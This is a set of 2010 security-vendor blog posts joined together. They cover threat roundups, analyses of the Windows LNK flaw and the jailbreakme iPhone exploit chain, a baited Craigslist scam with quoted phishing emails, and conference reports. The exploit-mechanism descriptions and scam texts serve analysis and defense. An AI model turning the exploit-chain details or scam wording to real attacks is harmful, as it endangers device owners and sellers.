The bad guys simply took the opportunity to make shortcuts to malware, and sent these shortcuts around to victims. The shortcuts could be activated without actually clicking on them. Using Windows Internet Explorer, merely browsing to the folder containing the malicious .lnk file triggered the bad stuff. Here is our technical analysis on the Microsoft LNK vulnerability.\nHot on the heels of Stuxnet, malware makers of Chymine, Vobfus, Sality, and Zeus updated their unwanted products to benefit from this vulnerability.

This month was more of the same. The RSA FraudAction Research Lab was among many to observe social sites being used to operate a banking Trojan virus. Once the Trojan infects a user\'s computer, the virus accesses a specific social profile, Google Group, or even a Twitter feed, all set up by the controller of the virus. From these sites, the virus, trained to parse text, can receive instructions embedded in posts, feeds, etc. This sophisticated exploitation of social sites bypasses the cost and maintenance of independent servers dedicated to doing the same thing. Using these free sites, communication with the Trojan can be done for no cost with little risk. It is up to the site to remove these malicious throw away accounts.\nThe other notable exploit of Web 2.0 functionality in July was YouTube\'s XSS vulnerability.  The visual effects of this vulnerability were seen by many users when only the top few comments of a post were loaded, along with a script comment regarded mostly as spam. Fortunately this was the extent to which the vulnerability was exploited before Google patched the YouTube service. Potentially this could have been used to force the browser to execute embedded malicious script code disguised in the YouTube page.\n \nBrowser and friends\nMozilla has blacklisted a third-party add-on called \"Mozilla Sniffer\". The add-on submits the login form of any website, with the password field, to a remote location. The add-on has been downloaded about 1800 times. Those who installed it are advised to change their password in case of attack. Mozilla also released two security updates this month; 15 vulnerabilities have been patched.\nIt has been disclosed by researcher Jeremiah Grossman that the \"autofill\" feature in Apple Safari has a security vulnerability. The autofill feature can be hacked to steal data from the computer\'s address book. Apple provided a quick response; a patch was released a few days later. In all, 15 vulnerabilities were fixed this month, including the autofill problem.\nGoogle released a security update for Chrome. Five bugs were fixed in the patch.\nThe good news from Adobe is that Adobe Reader is going to add Protected Mode in the next version. Protected Mode is a sandboxing technology based on Microsoft\'s Practical Windows Sandboxing technique. It is similar to the Google Chrome sandbox and Microsoft Office 2010 Protected Viewing Mode. All operations required by Adobe Reader to display the PDF file to the user are run in a very restricted manner inside a confined environment. More good news is that Adobe will join Microsoft Active Protections Program (MAPP), in which vulnerability information is shared to security software providers in advance.\n \nMicrosoft\nAside from the major LNK vulnerability brouhaha mentioned above in the Major Hits section, Microsoft patched a vulnerability in Windows Help and Support Center (MS10-042), Canonical Display Driver (MS10-043), MS Office Access ActiveX Control (MS10-044), and MS Office Outlook (MS10-045).

Dr. Robinson offered to send the payment via PayPal and asked that the laptop be shipped to his son in Nigeria.\n \nFrom: Donald Robinson [donaldrobinson1001@gmail.com]\n  Sent: Thursday, August 05, 2010 6:07 AM\n  To: xxx\n  Subject: Re: HP   Laptop - $280 \n  Hello,\n   I am very grateful to hear back from you.I am a Medical Doctor residing in Utah.The (HP Laptop) is for my son\'s birthday present,due to his brilliant performance,he was currently transferred from US to West Africa with his team on a research on Human development under world Health Organization. I\'ll be paying you through paypal.I will forward my son\'s residential address to you for shipping as soon as the payment reaches you.send me your paypal email so that i will do the payment.\n   NB: I will be paying you $400 for both the cost price and shipping fee.Please get back to me so that i will proceed with the payment.\n  Best Regards,\n  Dr. Robinson.\n \nI created a fake email account and sent Dr. Robinson the following note\n \nDear Dr Robinson,\nPlease send me your son\'s address and I will ship the laptop as soon as I receive the payment through paypal. My paypal email is xxx@gmail.com.\n  Thank you for your interest.\nRegards,\n \nCouple of hours later I received a phishing email claiming to be from PayPal indicating that I got a new fund from Dr. Robinson. Dr. Robinson was very generous and sent me $400 not $280 as was posted in the craigslist ad. The social engineering part in the email was interesting:\n\"This PayPal payment has been deducted from the buyer\'s account and has been \"APPROVED\"but will not be credited to your account until the shipment reference/tracking number is sent to us for shipment verification and this is done to secure both the buyer and the seller against any fraudulent activities. Below are the necessary information requested before your account will be credited. Send tracking number to  us or email us through  paypalaccountserviceinfo@ovi.com and our customer service care will attend to you. As soon as you send us the shipment\'s tracking number   the money will be credited to your account and this is done for security purposes and the safety of the buyer and the seller.\"\n \n\n \n\nCouple of minutes later, I received another phishing email claiming to be from PayPal telling me that PayPal is waiting for my shipment tracking number. Also, they assured me that the order has been confirmed and that I can ship the order now to the buyer, but I have to do so within 48 hours. I googled that transaction ID \"8UG760668M701084Y\" and found three posts [1,2,3] talking about similar scams.\n\n \nCouple of minutes later, Dr. Robinson emailed me and told me that he has sent me the money via PayPal. He asked that I ship the laptop first thing in the morning via USPS first class express mail in an insured package. The interesting thing about this address is that all the three posts above share the same city and state in Nigeria \"Uwani, Enugu, Nigeria\". I looked up the city in google maps, but did not find anything eye-catching, except Enugu prison that was in the neighborhood!\n\n \nDavid Robinson: I wish you a very happy birthday and I with you success in your research on human development in Nigeria, but you are not receiving a laptop for your birthday. Brad can send you one if he likes :)\n \n(Acknowledgment: T and R)', 'https://www.forcepoint.com/blog/security-labs/419-scams-go-phishing\n');

If you launch Safari and connect to the jailbreakme site, you can have your phone jailbroken with just a few steps. Obviously, this can be abused by bad guys to attack any iPhone in the world. We had time to analyze the mechanism of jailbreaking, and as we expected, it\'s just a matter of time before anyone can abuse this. Here\'s the summary of what we found. \n\n    Picture 1: The flow of Jailbreaking using 2 iPhone vulnerabilities\n \n\nFirst, the process uses the PDF Compact Font Format vulnerability (CVE-2010-1797). To our surprise, it\'s a simple stack-based buffer overflow. With this vulnerability, an overly long CFF charString entry ends up with attacker-controlled $pc. Many people think of Return Oriented Programming (ROP) as a rather immature technique to use for complicated jobs. But the jailbreakme shellcode uses ROP to execute more than a total of 150 API calls. This means non-executable memory is not a defense against these kinds of memory corruption attacks. Looks as if the current ROP technique for iPhone exploitation is very mature and stable. \nThe ROP payload actually abuses an undisclosed kernel vulnerability residing in an IOSurface component from Apple. It seems that the vulnerability allows a normal process to have access to kernel memory with write privileges. After it modifies kernel space data to circumvent security checks, it calls “setuid(0)” to get root access. So, the game is pretty much over at this point. The Safari process at this point has root user privileges, and it can do whatever it wants. \nAfter this exploitation phase, it drops the “installui.dylib” shared library, loads it, and executes the “iui_go” function from the library. This allows some UI text to be displayed on the user\'s screen to ask whether to go forward with jailbreaking. Then it downloads the “wad.bin” file from the jailbreakme site and extracts necessary files like “install.dylib” from there, and then executes the “do_install” function from there, which will do the typical jailbreaking process. All these operations are possible because the Safari process has root access acquired using the kernel bug. \nThe jailbreaking phase involves something like moving some system directories and modifying essential system files like “/etc/fstab”. Also it directly accesses the “/dev/kmem” device to patch kernel flags or code. And finally it installs the “Cydia\" installer package and restarts SpringBoard using the “uicache” command. \nThe whole lesson here is that it is extremely easy to modify PDF payloads provided by the jailbreakme site, to make it do more operations than it was originally intended to do. The attack will surface soon, and it could be devastating, because we don\'t have any practical defense mechanisms against this type of attack on iPhone. We\'d better try not to click any suspicious links on our iPhone browser from now on. And we\'d better not check any PDF attachments delivered through iPhone mail until we have the fix. I hope the patch will be out soon, and I recommend that everyone install the patch when it\'s out.', 'https://www.forcepoint.com/blog/security-labs/technical-analysis-iphone-jailbreaking\n');

Jailbreaking these devices is nothing new. It\'s been done for years to allow these devises to run applications not approved by Apple, and also as a means to unlock iPhones for use on other carriers. What is different in this new method is that all that it takes to jailbreak the device is to visit a specific website using the built-in Web browser. Previously users had to connect the device to a computer and use software for Windows or Mac to complete the process.\n \nAt jailbreakme.com, all it takes to complete the jailbreak is to slide the arrow to the right and wait for the process to complete. To perform the jailbreak the process takes advantage of two vulnerabilities; one in how Safari parses PDF files, and one in the kernel of iOS/iPhoneOS. VUPEN has more information about these vulnerabilities in their advisory.\nApple is reportedly looking into the vulnerability issues, but until they have issued a patch, all users of iPhones, iPads, or iPods are at risk, because there is nothing that prevents a malicious attacker from using these vulnerabilities to automatically install malware onto the device. Reports around the Web are claiming that there isn\'t much a user can do to prevent this type of attack unless you\'ve already jailbroken, as there is an add-on, via Cydia, that will warn you for every PDF you open. However, this is not entirely true.\nWhile it is true that Safari and other Web browsers on iOS/iPhoneOS automatically render and display a PDF page, and therefore will load the exploit automatically, some third-party browsers have customizable filters that can block the attack and prevent your device from compromise. Two examples are Atomic Web Browser and iCabMobile, both of which work on iPhone, iPod Touch, and iPad.\nHere is how you enable and tweak the application filters to prevent PDFs from being downloaded in the browser.\nAtomic Web Browser\nStart the application, click the Settings icon, and click Settings.\n  Click \"Ad Block Settings\" and then \"Edit Ad Block\".\n  Click \"New Filter\" and then enter: *.pdf\n  Click \"Done\" and \"Save\".\n  Click \"Ad Block\" at the top-left corner and enable the Ad Block Feature.\n \niCabMobile\nStart the iCabMobile application and click the Settings icon.\n  Scroll down until you see \"Edit Filters\" and click that selection.\n  Click \"Create New Filter\" and enter: *.pdf\n  Click \"Done\" and then \"Tools\" in the upper-left corner to go back to the Settings menu.\n  Scroll up and make sure that the \"Enable Filters\" settings is set to \"On\".\n \nWhile we at Websense, Inc. don\'t support or endorse these products, neither of which are free, they could be a worthwhile investment until Apple fixes the problem. \nFinally, don\'t forget that these third-party browsers will not protect you if you get a PDF in an email message, click on a link in an email/SMS or click on a link that launches a built-in browser in the app (like Twitter, Facebook etc). These all use the Safari engine to view the PDF and will bypass the third-party browser filters.', 'https://www.forcepoint.com/blog/security-labs/jailbreakme-drive-attacks-ios-and-limiting-potential-attacks\n');

We\'ve moved well beyond such contrite terms as Web 2.0 as these tools embedded themselves into our lives to become the world as we know it.\nIt seems like only a few years ago that IT security could simply block access to a few social networking services and call it a day. But now even the United States Department of Defense struggles to balance the seemingly contradictory needs of security and access to an important personal communications tool. While some might still consider social networking little more than a distraction or fad, it\'s clear that these services are as important to younger workers (and members of Congress) as letter writing, newspapers, and oxygen. \nWith very few exceptions, organizations are finding that at least some level of access to social networking is essential to obtain and retain employees. And, like any communications tool, social networking comes with certain security risks. I like to break social networking security into five buckets: the two major categories of risk, and the three components to your social networking security program.\nTwo Categories of Risks\nFrom a security perspective, these are the top two major categories of risk:\n1. Exploits, Malware, and other Attacks — Fundamentally, social networking is about the construction of trust relationships in the digital world. Sometimes these mirror or extend physical relationships, but they are now just as likely to completely exist online. Bad guys take advantage of both of these relationships (and trust in the social networking platforms themselves) to execute a variety of malicious attacks. They take over trusted accounts to trick users into running malware, spam, and phish across the network, and sometimes leverage browser or server vulnerabilities to exploit the platform itself. These attack techniques aren\'t necessarily new, but when an attacker leverages an established trust relationship or personal information shared online, they increase their chances of success.\n2. Information Leaks — Deliberate or not, social networking platforms are a great source for the inadvertent disclosure of sensitive information. On messaging-oriented services like Twitter and Facebook, users will sometimes reveal a little too much about corporate plans or internal workings. When we add blogging to the mix, the potential for long-form exposures increases. \nOf these two categories, exploits/attacks are the most concerning. Information leaks are definitely an issue, but you are realistically more likely to suffer a major leak when someone mis-types an email address with a sensitive document attached, as opposed to a mistaken tweet.\nThree Pillars of Social Networking Security\nThere are three major components of a social networking security program:\n1. Policies — Some organizations allow social networking, some don\'t, and most fall somewhere in between. Your policies define allowed behavior, educate employees on safety and security, and provide a framework for managing violations. Policies need to cover:\n  -  which social networking services are allowed\n  - what content employees are allowed to share (e.g., restricting any discussions of the workplace)\n  - use of extended features like games or file downloads, and\n  - what monitoring or blocking will be in place. \n  Policies should also cover the enforcement process, such as when human resources, legal, or an employee\'s manager will become involved. Don\'t forget to educate your employees on these policies—making them more aware of potential issues and letting them know someone is keeping an eye on what they might be doing. \n2. Inbound Defense — Policies guide human behaviors, but we turn back to tools for our technical defenses. Content security tools filter inbound traffic over the Web, email, and (some) other services. You can use them to block file downloads, which is a major malicious software vector. Anti-malware tools extend protection to the endpoint, and patch management tools help keep your systems up to date and reduce the risk of known exploits. While these layers aren\'t invulnerable, the combination can significantly reduce the amount of malicious software running in your environment. \n3. Outbound Filtering — Data Loss Prevention is an effective tool for monitoring any outbound communications, especially social networking. DLP isn\'t limited to protecting credit card numbers; you can also build policies to detect and protect usage of sensitive corporate information such as financials, customer lists, or intellectual property.\nSocial networking is neither good nor evil — it\'s simply another vector for humans to connect with each other that comes with risks and benefits.\nRich has twenty years of experience in information security, physical security, and risk management.

When thinking about IT security and social networking, you should consider the following: \nHow are you managing data leakage prevention over web-based email?\n    \n    How are you currently managing risks associated with personally identifiable data (PII)? \n    \n    How are you enforcing compliance with regulations such as Gramm-Leach-Bliley Act, PCI, and HIPAA?\n    \nAnd keep in mind that Acceptable Use Policies (AUP) can be hard to identify on social networking sites. This is because many URL filters only look at top-level domains such as www.facebook.com and www.twitter.com. Much of the content on these sites is user-generated and is typically posted in real time. If the filter is only set to allow people to use social networking sites, there will be risk attached to every link posted.\n\nHere is where Web data loss prevention (DLP) is crucial to maintaining a safe social networking environment. Web DLP focuses on data loss through the Web.  It helps protect users, data, and the corporate computing environment simultaneously through a single secure Web gateway (SWG). Integrated  gateways also open up space in data centers, save on power and cooling costs, and reduce capital expenses.  Aside from safely incorporating social networks in the organization, this approach can also simplify deployment and policy management by having the same settings used across Web security and Web DLP functions.  \n\nWebsense allows organizations to constructively use Web 2.0 while helping prevent the risk of malware and the constant threats that are delivered through even the most legitimate sites.

In order to be effective, the exchange between a business and its audiences must take place in the form of a conversation.  It’s important to remember that social media is a two-way street.  In order to work well, it must allow a dialogue to occur between companies or celebrities and their fans.  This dialogue takes the form of user-generated-content (UGC). \nThe unfortunate truth about UGC is that while it allows a Lady Gaga fan to publish what they thought of her latest single, it also provides them with an opportunity to post other, more nefarious elements on her page. From spyware, rogue AV, malicious drive-by attacks and data stealing Trojans, we’ve seen an unfortunate number of fans duped by the bad guys through UGC on social media sites. Fan pages can quickly become a victim to exploits like these, like the recent exploit code posted on Justin Timberlake’s page and more than 250,000 other pages. What if the Los Angeles Lakers 3.6 million fans on Twitter and Facebook were exposed to a malicious link?\nIn addition, we’ve seen malware posted on Barack Obama’s official campaign blog, Twitter accounts hacked of major celebrity like Britney Spears and Ellen DeGeneres  and Guy Kawasaki’s Twitter account hijacked and used to send out a malicious link to his 140,000 followers. We’ve also seen major Twitter and Facebook malicious campaigns (“Most Hilarious Video” attack on Facebook) that have spread like wildfire throughout social media sites.\nWhat would you do if your business’ Facebook page had malicious links posted on it? How do you think your fans would feel if they found out that the virus that has been troubling them on their computer was caught by clicking a link from your blog?\nThese are the types of issues we are going to explore this month as we discuss social media. Unfortunately, with the rise of social media, there has also been an influx of new threats, which take advantage of the trust your fans have in you and your company.\nWe’ll start this month off with two recent articles featuring our researchers on this very topic. In the first article, “Right to reply: Facebook 500 million user milestone great news for enterprises – but vigilance still needed”, Carl Leonard, Security Research Manager EMEA, Websense, explains why an increasingly connected world should be greeted with caution.\nIn the second article, “Real-Time Searches Lead to Real-Time Malware” from the Technology Review, Websense CTO Dan Hubbard is excerpted from his recent BlackHat presentation describing how search engines can be duped by botnets and UGC to poison search results and users in real-time. Google and Bing have already been victims to this sort of malicious use. Can Facebook streams and Foursquare be far behind?\nCompanies and high-profile individuals need to be vigilant with their social media properties if they want to continue maintaining the trust and bond they have built with their users.

We\'d list them here, but this year\'s schedule is so packed with phenomenal talks that we\'d end up listing everything in the schedule having to do with taint analysis, visualizing social networks (Maltego), memory corruption attacks, the state of SSL, and so much more. It is Vegas, after all, so once the talks are done at the end of the day, we\'re planning to hit up as many of the Blackhat parties as we can (like Thursday night\'s Microsoft Party), so we hope to see you there!\n\n\n	Jay Liew and I  (Stephan Chenette) will also be attending, and all four of us will be tweeting our locations and opinions of the talks. You can follow our tweets and direct message us to meet up for a drink, discussion, or interview.\n\n\n	Our Websense Twitter account is: WebsenseLabs.\n\n\n	Here are the titles and abstracts for the two talks by Websense Security Labs speakers.\n\n\n	Speaker: Dan HubbardTitle: Cloudy with a chance of miss-informationAbstract:The biggest use today of the cloud is the use of the web and web services, platforms, and content. Users want their information and they want it NOW. With that the several new technologies have been created/added/modified to present data in real-time. One of these is real-time search.Attackers have been utilizing weaknesses within search engine algorithms for some time now. Today it is VERY likely that you will hit a poisoned result on any named current event search. However we have not seen attacks commonly happening within the social web through real-time search.Search engines are embracing the social web through real-time search results. This presentation will demonstrate how to poison the real-time web with your results in real-time.    * Will demonstrate how today’s search engine poisoning works.    * Will demonstrate how to poison the social web through real-time search in various search engines.    * Will include demonstrations and steps to perform actions including mitigation options.    * Will demonstrate future vectors and possibilitiesHere is a link to the schedule for the Cloud Security Alliance:https://www.blackhat.com/html/bh-us-10/bh-us-10-specialevents_csa.html\n\n\n	Speaker: \"Matt\" Jeongwook OhTitle: ExploitSpotting: Locating Vulnerabilities Out Of Vendor Patches AutomaticallyAbstract:We already have many kinds of binary patching systems available. There are commercial ones and free ones. But the current implementations only concentrate on finding the difference between binaries. But what the security researchers really want from the patch analysis is security patches. Sometimes it\'s very hard to locate security patches because they are buried inside normal feature updates. The time for locating the security patches will increase drastically as more feature updates are included in the released patches. This is especially true with all the Adobe and Sun product patches. They tend to mix security patches and feature updates.In that case, we need another way to boost the speed of the analysis. The automatic way to locate the security patches! This can be done by analyzing the patched parts and see if it has some specific patterns that the usual security patches have. Some integer overflow will have some comparison against the boundary integer values. And buffer overflow will involve the vulnerable \"strcpy\" or \"memcpy\" replaced with safer functions. Even free-after-use type bug has their own patch patterns. We will present all the common patterns that we saw and also present way to locate them using pattern matching. But there can be more thing to be done in addition to this simple approach. You can introduce static taint analysis to binary diffing world. You can trace back all the suspicious variables(expressed as register value or memory location) found in the patch by using binary diffing. And you can see if they are controllable or taint-able from the user controllable input like network packets or user supplied file input.This automatic security patch locating ability will be beneficial to the IPS rule writers. They can spend more time in concentrating on what really matters instead of spending time to find the actual parts to analyze. To achieve all these, I upgraded the current implementation of \"DarunGrim(http://www.darungrim.org)\" binary diffing system to support pattern matching and static taint analysis. It will become DarunGrim v3. DarunGrim is the most featured open source binary diffing implementation. I will show how fast we can locate the vendor patches that, otherwise, will take few hours using other tools. All the updated source code will be released at the presentation.\n\n\n	We hope to see everyone at Blackhat Vegas!', 'https://www.forcepoint.com/blog/security-labs/blackhat-vegas-2010\n');

As the blog post, and other posts, state, this is caused by Windows Control Panel\'s shortcut image display routine. The original blog post shows a stack trace of the exploit results, which also serves to explain the vulnerability. \nThe nature of the vulnerability is pretty clear. But out of curiosity we did some reverse engineering and here is what we have found. The bug itself is a design flaw as stated by many people and it\'s very straightforward to locate the point where it happens. The vulnerable file is shell32.dll and the vulnerable routines are Control Panel-related. We loaded the binary on a disassembler and found that the Control Panel file-related routines start with a “CPL_” prefix. \nDrawing 1 shows the relations between CPL initialization routines and data flow. The red “LoadLibraryW” API is the vulnerable one.\n\nDrawing 1: The flow of the related routines and data\n \nThe icon extraction routine calls “CPL_FindCPLInfo” to find the icon information of the target file. The “CPL_FindCPLInfo” routine is basically a wrapper around all CPL-related routines. The loading and initialization of the CPL module is performed before getting any information out of it. One of the initialization routines, “_LoadCPLModule”, calls the “LoadLibraryW” API to load the target CPL dll for future use. The module handle acquired from this call is used later in the “_InitializeControl” routine with the “LoadImage” API. There are ways to acquire an icon handle from a dll without loading it, but in this case the programmer chose to load the target dll for some reason, which opens the vulnerability.\nIt looks like the security side-effects of one module are not evaluated fully before it\'s combined with other modules.\n \nWe recommend following this Microsoft security advisory to disable icon display or the WebClient service until a patch for this flaw is released.', 'https://www.forcepoint.com/blog/security-labs/microsoft-lnk-vulnerability-brief-technical-analysiscve-2010-2568\n');

The event was hosted in the beautiful \'Venice of the North\', Amsterdam (Netherlands), the home of canals, windmills, tulips, and probably the best cheese in the world. One of the most beautiful hotels in the heart of Amsterdam, the Krasnapolsky, offered a welcoming environment for this occasion. \n\n \nMy subject was FireShark, which is an open source tool written by Stephan Chenette, our Principal Security Researcher at Websense. Stephan originally created an ultimate de-obfuscation tool by hooking Internet Explorer\'s DLLs and dumping eval and document.write calls. This tool was presented at Toorcon last year and the code was released. Later on he moved to a Firefox plugin where he could use proper APIs provided by Firefox, as opposed to hooking function calls in DLLs. He also added new ideas to the project which gave the tool new functionalities. Currently FireShark covers two main problems: ultimate de-obfuscation, and creating a graphical map of compromised Web sites. Both of these features are based on monitoring Firefox\'s internals to discover redirections, iframes and newly created DOM objects. Because the Web page is loaded into a real browser instead of an emulator, it does not matter how the obfuscation works: the browser sees all the results of the JavaScript code running while visiting the page, which is then logged by FireShark. No emulation is involved, therefore this is an \'ultimate de-obfuscation\'. Later on this log can be analyzed to see the real intention of the code. Also in the meantime it logs all redirections and iframes made by the page, and that data can be post-processed to generate a nice graphical map about connections made to other Web pages. For example, if there is a mass-injection campaign we could see that all the compromised Web sites are making connections to one suspicious landing site. Will we discover something new by seeing all of these? Hopefully that question will be answered soon. \nThis year at the HITB conference, we had the option to hear many very interesting talks from various security experts from all over the world, including deep analysis of shellcode, hardware hacking, and traveling to the Russian cyber underground. \nI attended the following talks: \nKeynote 1: Security Chasm - Dr Anton Chuvakin\n  Anton is a well-known security expert and the author of many books about this subject. In his talk he emphasized the importance of focusing on real security issues rather than conceptual theories. He was wondering why people are more afraid of getting a fine by not wearing a seatbelt rather than worrying about the risk to their life. He also took a nice overview of the history of information security and a prediction on how it will be changed in the following 5 or 10 years. \n  Breaking Virtualization by Switching to Virtual 8086 Mode - Jonathan Brossard\n    Jonathan had a nice talk about the security issues of virtual machines, especially escaping code from virtualized servers. Server virtualization is very important nowadays, mostly used in Web hosting environments. As he pointed out, an attacker might take over the host computer breaking out of the virtualized hardware using an almost forgotten CPU mode, the virtual 8086 mode. \n  From Russia With Love 2.0 - Fyodor Yarochkin\n    Fyodor is an independent network security researcher who digs deep down into the world of the Russian cyber underground, revealing many of their secrets and myths. He explained how they are organized and why they do what they do - unsurprisingly it is all about the money. Fyodor also pointed out that many people do not even realize they are involved in a cyber crime. They get a temporary job offer over the Internet and once they finish their assignment they receive the money online. Sounds like a legitimate business; however, in the end the work is related to illegal activity.  \n  Keynote 2: Ten Crazy Ideas That Might Actually Change the State of Information Security - Mark Curphey\n    Mark is the director of the MSDN Subscription Engineering team at Microsoft. He had some very interesting ideas about the fundamental issues of information security, and laid down 10 ideas that could change the security industry. He compared this work to how WHO stopped one of the deadliest diseases in the history of human kind, smallpox. Mark also highlighted that maybe security experts should work in the same way as a Chinese doctor: paid only if healthy, not when sick. \n  Maltego 3: Start Your Engines - Reolf Temmingh\n    Reolf is the founder of Paterva Ltd, the creator of Maltego. Maltego is an open source intelligence and forensics application. It can be used to connect information and their sources together revealing many interesting details about a subject or even about people. Fyodor was actually using Maltego for his findings about the Russian cyber underground. Reolf presented the capability of the new version 3 to the audience.  \n  Abusing Microsoft\'s PostMark Validation Protocol - Dimitru Codreanu\n    Dimitru is a Senior Researcher at BitDefender. He did research on a GPU and FPGA-assisted application that can break Microsoft\'s PostMark Validation Protocol. This protocol helps with fighting against spam, and it was claimed that to break this system, the spammer needs to invest hundreds of thousands of dollars in hardware. Dimitru showed the weakness of the protocol and that using a GPU (graphical card like nVidia GeForce) or an FPGA card inserted into an ordinary PC could lead to signing 3-8 million mails per day with PostMark Validation, with an investment of only around a few hundred dollars.  \n  Subverting Windows 7 x64 Kernel with DMA Attacks - Cristophe Devine & Damien Aumaitre\n    Cristophe and Damien are Security Researchers at Sogeti/ESEC and they made a very interesting showcase of how vulnerable our computing systems are to hardware-based attacks. They have inserted a PCMCIA card into a laptop running Windows 7 for a couple of seconds, which then accepted any random string entered to the Windows Logon screen as a valid password. They have pointed out that hardware that can use DMA (such as FireWire / IEEE1394, PCMCIA, ExpressCard and PCI card) is bypassing any security protocol in the operating system, leaving our computers open to attacks. \n  Top 10 Web 2.0 Attacks and Exploits - Sheeraj Shah\n    Sheeraj is the founder of Blueinfy and the author of many books on Web 2.0 Security. In his talk we got an overview of the top 10 Web 2.0 attacks, exploits, and hacking techniques. He also explained new tools and methodologies to prevent attacks like these. \n  The Traveling Hackersmith 2009-2010 - Saumi Shah\n    Saumi is the founder of Net-Square and the author of many books and tools. He was talking off the record this time about discovering security issues in online flight bookings and hotel room reservations during many of his travels. As it was off the record it would not be ethical to write down his subject in detail. He emphasized that he does not want to prove a point; however, overall my conclusion was that he was worrying about Web shops in general, how highly insecure they are, simply because either the developer does not know much about information security or because they just do not think a cyber criminal would target their site at any time.\n \nThe conference material can be downloaded from the HITB Web site.', 'https://www.forcepoint.com/blog/security-labs/hack-box-first-time-europe\n');

This past month, we presented at both EUSecWest in Amsterdam and SyScan in Singapore. \n  If you missed us there, not to worry, in just a few weeks we are presenting at Black Hat and DEF CON, both in Las Vegas. Come say hi to us!\nMajor hits\nEvery major event and news item is followed very closely by exploiters looking to achieve some profit. It may be the death of a celebrity or a major event such as FIFA World Cup; the bad guys are always there. With the World Cup still ongoing, we continue to see targeted attacks of known zero-day pdf vulnerabilities, the infamous 419 scam letters, phishing attempts, and of course the more popular than ever Blackhat SEO scareware campaigns.\n  More than 100k popular Web sites were compromised last month with a mass injection targeting IIS using ASP.net platform. The attack came from Chinese IP addresses and the injected iFrame led to a Chinese-hosted domain http://www.ro[REMOVED]nt.us serving juicy Mal/Behav-290 malware. The majority of Web sites were cleaned up in matter of hours.\n  Apple, Inc. was accused of a data breach resulting in the loss of 100k email addresses and ICC-ID numbers. A few hours later the finger was pointed to the real miscreant. An AT&T designed and secured Web application allowed the Goatse hacker group to match ICC-IDs with email addresses used by iPad users to access their iTunes accounts. Observations? If you are a developer, carefully design and review for security and secure coding practices. If you are a hacker, do not irritate a giant without very good armor. \nWeb 2 dot uh oh\nIt seems like everyone on the Web today is trying to figure out how to leverage social networking tools (Facebook, Twitter) for \"viral\" marketing. Even the bad guys. This month, the baddies used a clever combination of social and technical tricks to increase their own reputation and get over 15,000 people to \'like\' them on Facebook. The social-engineering trick started off with a lure (as they all do) to see the \"best passport application rejection in history\". Behind the scenes, an invisible Facebook \'like\' button follows your mouse cursor, guaranteeing that you\'ll click on the Facebook \'like\' button regardless of where you click on the malicious web site. The consequence of clicking the hidden \'like\' button is that a link to this web site is posted on your Facebook profile for all your friends to see - and if they too click on it, the cycle repeats itself. \n  In a separate Facebook scam involving the lure \'Teacher nearly killed this boy\', a rogue Facebook app requested permission to access the viewer\'s profile information, and permission to post content on the viewer\'s Facebook wall. Users who don\'t pay attention and simply click through to get to the video risk the safety of their Facebook friends should they click on something malicious that could be posted by the rogue app from the viewer\'s wall.\n  A persistent cross-site scripting (XSS) vulnerability was discovered on Twitter. You may recall a similar incident some time ago, but whereas the previous case involved the application URL, this time around it involves the application name.\n  A study by ISACA, an international organization that researches IT governance and control just published a research paper that listed viruses and malware, brand hijacking, and lack of control over corporate content as some of the top risks faced by companies using Web 2.0 social media tools. \n  Is that any surprise?\nBrowser & friends\nAdobe made a big splash in the security market this month. New zero-day vulnerability (CVE-2010-1297) was discovered early in the month. A few days later PDF samples embedded with a SWF file exploiting the vulnerability were found in the wild. The samples spread as an email attachment. And then html pages with exploited SWF files arrived. The more convenient method has been used to attack customers. Details about the zero-day vulnerability can be found here.\n  In the middle of the month Adobe released a security update for Flash Player that fixes 31 vulnerabilities, including the zero-day vulnerability. At the end of the month Adobe released a security update for Adobe Reader and Acrobat to fix the zero-day vulnerability. You should update your Flash Player and Adobe Reader as soon as possible. Mozilla released 8 security advisories this month, several critical vulnerabilities were fixed in the recent Firefox update. A new feature called Crash Protection, also known as OOPP(Out Of Process Plug-ins) has been added to Firefox 3.6.4. With this feature, the plug-in process is isolated from the browser process. This makes the browser more stable because a plug-in crash should not affect the browser. Apple has patched 48 vulnerabilities for Safari and WebKit.\nMicrosoft\nThe two big events this month were Microsoft\'s busy Patch Tuesday, addressing 34 vulnerabilities, and a zero-day POC released by a Google security researcher.\n  Among the many fixes this month, Microsoft fixed the SharePoint XSS bug from April and a publicly disclosed data leakage vulnerability in Internet Explorer.  Other vulnerabilities affect Windows, Office, Internet Explorer, and the IIS Web server.\n  Tavis Ormandy, a security researcher at Google, released a zero-day exploit in the Windows Help and Support Center that allows remote code execution.  Tavis posted exploitation details to the Full Disclosure list just a few days after notifying Microsoft of the vulnerability.  Microsoft released and discussed an advisory on the issue, including a workaround to disable the HCP protocol being exploited until a patch is released.\nHello ThreatSeeker. You\'ve got mail!\nDelivering Web sites as an attachment via email is a bit like snail-mailing someone a newspaper clipping when you can just send them the URL. As silly and inefficient as that may be, if the method delivers, then it\'s well worth it. And that\'s exactly what the malicious hackers did: deliver malicious Web sites as an attachment via email. In this incident, victims were told their computers were infected and that they needed to open the attachment \"Virus Scan.html\". This resulted in the computer downloading a malicious PDF and Java .jar file.\n  The bad guys also capitalized on the official launch of the much anticipated iPhone 4 by delivering scams via email and also posting them on Facebook. The lure enticed users with the chance of receiving a free iPhone 4 (yes, some offers on the Internet are just too good to be true. Always proceed with caution!)\n  Other assorted unhealthy snacks served up via email this month included the following themes:\nReset your Twitter password - malicious link to fake AV\n  FIFA World Cup South Africa... bad news - malware attachment in a \"news.html\" file\n  Account verification (yeah, this one\'s subject line is boring in comparison) - malicious link to malware and exploits\n  Notice of Underreported Income (masquerading as from the IRS) - malicious link to fake site and malware\n\n \nSecurity Trends\nJoanna Rutkowska, who is known for her work on virtualization security and low-level rootkits, is building a project named  Qubes, which is an open-source OS meant to provide isolation of the OS components for better security.\n  At the Syscan\'10 Singapore conference, security researchers from TEHTRI-Security published twelve zero-day flaws targeting five of the most common Web malware exploitation kits, such as Neon, Eleonore, Liberty, Lucky, and the Yes exploitation kits.\n  It was observed in a specific malicious spam campaign, that the malicious HTML file attachment used the same obfuscation algorithm as a known mass injection attack on the web.\n\n  This month\'s contributors:\nLei Li\n  Ulysses Wang\n  Erik Buchanan\n  Ivan Sabo\n  Jay Liew', 'https://www.forcepoint.com/blog/security-labs/month-threat-webscape-june-2010\n');

